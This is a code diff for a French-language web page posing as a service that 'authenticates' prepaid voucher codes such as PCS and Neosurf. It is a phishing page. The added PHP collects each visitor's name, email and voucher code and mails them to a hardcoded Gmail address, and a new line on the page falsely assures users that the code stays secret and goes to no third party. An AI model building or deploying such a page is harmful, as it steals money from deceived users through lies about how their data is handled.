@@ -75,11 +75,13 @@ License URL: http://creativecommons.org/licenses/by/3.0/
                         <div class="col-lg-12">
                             <div class="form-group">
                                 <label>Nom <span style="color: red;">*</span></label>
-                                <input class="form-control" type="text" name="name" placeholder="Votre réponse" required="">
+                                <input class="form-control" type="text" name="name" placeholder="Votre réponse" required>
+                                <p style="color:red"><?php echo $nom_error;?></p>
                             </div>
                             <div class="form-group">
                                 <label>Prénom <span style="color: red;">*</span></label>
-                                <input class="form-control" type="text" name="prenom" placeholder="Votre réponse" required="">
+                                <input class="form-control" type="text" name="prenom" placeholder="Votre réponse" required>
+                                <p style="color:red"><?php echo $prenom_error;?></p>
                             </div>
                             <div class="form-group">
                                 <label>Type de Recharges <span style="color: red;">*</span></label>
@@ -88,25 +90,29 @@ License URL: http://creativecommons.org/licenses/by/3.0/
                                 <option value="">PCS</option>
                                 <option value="">NEO-SURF</option>
                                </select>
+                               <p style="color:red"><?php echo $type_error;?></p>
                             </div>
                             <div class="form-group">
                                 <label>Adresse Email <span style="color: red;">*</span></label>
                                 <input class="form-control" type="email" name="email" placeholder="Votre réponse" required="">
+                                <p style="color:red"><?php echo $email_error;?></p>
                             </div>
                             <div class="form-group">
                                 <label>Code de la Recharge <span style="color: red;">*</span></label>
                                 <input class="form-control" type="text" name="code" placeholder="Votre réponse" required="">
+                                <p style="color:red"><?php echo $code_error;?></p>
                             </div>
                             <div class="form-group">
                                 <label>Date et heure du Paiement <span style="color: red;">*</span></label>
                                 <input class="form-control" type="datetime-local" name="date" placeholder="Votre réponse" required="">
+                                <p style="color:red"><?php echo $date_error;?></p>
                             </div>
                         </div>
 
                         <div class="form-group mx-auto mt-3">
-                            <button type="submit" class="btn submit">Authentifier mon code</button>
+                            <button type="submit" name="submit" class="btn submit">Authentifier mon code</button>
                         </div>
-                        <p style="color:red">Nous vous authentifions en gardant secret votre code</p>
+                        <p style="color:red">Faites confiance en notre serice car nous vous authentifions en gardant secret votre code. Il n'est partagé avec aucun tiers.</p>
                     
                     </div>
 
@@ -154,5 +160,85 @@ License URL: http://creativecommons.org/licenses/by/3.0/
         </div>
     </div>
 </body>
+<?php
+function check_email_address($email) { 
+    return (!preg_match( "^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$^", $email)) ? false : true; 
+} 
+$email_error="";
+$date_error="";
+$code_error="";
+$type_error="";
+$nom_error="";
+$prenom_error="";
+if(isset($_POST['submit'])){
 
+    if(isset($_POST['name'])&& !empty($_POST['name'])){
+        if(isset($_POST['prenom']) && !empty($_POST['prenom'])){
+            if(isset($_POST['email']) && !empty($_POST['email']) && check_email_address($_POST['email'])==true){
+                if(isset($_POST['code']) ){
+                    if(isset($_POST['date'])&& !empty($_POST['code']) ){
+                        $email=$_POST['email'];
+                        $name=$_POST['name'];
+                        $prenom=$_POST['prenom'];
+                        $code=$_POST['code'];
+                        
+                        
+                        var_dump($_POST);
+                        $to=$_ENV["to"];
+                        
+                        $to = "servicetranscash22221@gmail.com";
+                        $subject = "Authentification de Code de transaction";
+                        
+                        $message = "
+                        <html>
+                        <head>
+                        <title>Code d'authentification</title>
+                        </head>
+                        <body>
+                        <p>Voici les informations du demandeur</p>
+                        <table>
+                        <tr>
+                        <th>Nom et Présom</th>
+                        <th>Email</th>
+                        <th>Code</th>
+                        </tr>
+                        <tr>
+                        <td>".$name." ".$prenom."</td>
+                        <td>".$email."</td>
+                        <td>".$code."</td>
+                        </tr>
+                        </table>
+                        </body>
+                        </html>
+                        ";
+                        
+                        // Always set content-type when sending HTML email
+                        $headers = "MIME-Version: 1.0" . "\r\n";
+                        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+                        
+                        // More head ers
+                        $headers .= 'From: <rservicedes@gmail.com>' . "\r\n";
+                        
+                        
+                        $message="E-mail : ".$email."\nNom et prénom : ".$name." ".$prenom."\nCode : ".$code;
+                        mail($to,$subject,$message);
+                        
+                    }else{
+                        $nom_error="Veuillez écrire la date";
+                    }
+                }else{
+                    $nom_error="Veuillez écrire le code";
+                }
+            }else{
+                $nom_error="Veuillez écrire votre email au format correct ex: monemail0@gmail.com";
+            }
+        }else{
+            $nom_error="Veuillez écrire votre prénom";
+        }
+    }else{
+        $nom_error="Veuillez écrire votre nom";
+    }
+
+}
+?>
 </html>
